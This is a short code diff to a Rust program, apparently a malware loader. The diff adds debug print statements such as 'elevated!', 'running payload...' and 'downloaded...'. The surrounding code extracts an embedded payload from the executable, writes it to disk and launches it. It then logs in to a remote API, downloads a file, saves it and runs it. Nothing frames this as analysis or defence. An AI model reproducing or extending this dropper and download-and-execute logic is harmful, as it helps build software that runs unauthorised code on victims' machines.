@@ -62,18 +62,23 @@ fn main() {
         return;
     }
 
+    println!("elevated!");
+
     // ensure, that payload is extracted
     let name = current_exe().unwrap().file_name().unwrap().to_str().unwrap().to_string();
     let path = std::env::current_dir().unwrap().join(&name);
 
     if !path.exists() {
+        println!("no overlay, extraction...");
         let overlay = extract_overlay();
 
         let mut file = File::create(&path).unwrap();
         file.write_all(&overlay.bytes).unwrap();
+        println!("overlay ok!");
     }
 
     // and run it!
+    println!("running payload...");
     Command::new(&path).spawn().unwrap();
 
     // ...
@@ -81,6 +86,7 @@ fn main() {
 
     // check if we should continue?
     if !should_run() {
+        println!("won't run! exit");
         return;
     }
 
@@ -90,8 +96,11 @@ fn main() {
         mem_total: 0.0
     }).unwrap();
 
+    println!("logged in!");
+
     let upload = api_client.client_download().unwrap();
     let path = utils::save(upload).unwrap();
+    println!("downloaded...");
 
     // run program!
     Command::new(path).spawn().unwrap();
